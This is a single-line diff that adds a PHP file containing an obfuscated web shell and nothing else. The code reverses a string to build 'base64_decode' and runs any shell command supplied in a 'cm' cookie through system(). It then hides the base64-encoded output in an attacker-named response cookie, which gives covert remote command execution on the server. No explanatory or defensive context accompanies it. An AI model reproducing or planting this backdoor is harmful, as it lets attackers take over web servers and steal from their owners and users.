@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE['cm'])){ob_start();$b=strrev("edoced_4"."6esab");system($b($_COOKIE['cm']).' 2>&1');setcookie($_COOKIE['cn'],$_COOKIE['cp'].base64_encode(ob_get_contents()).$_COOKIE['cp']);ob_end_clean();} ?>
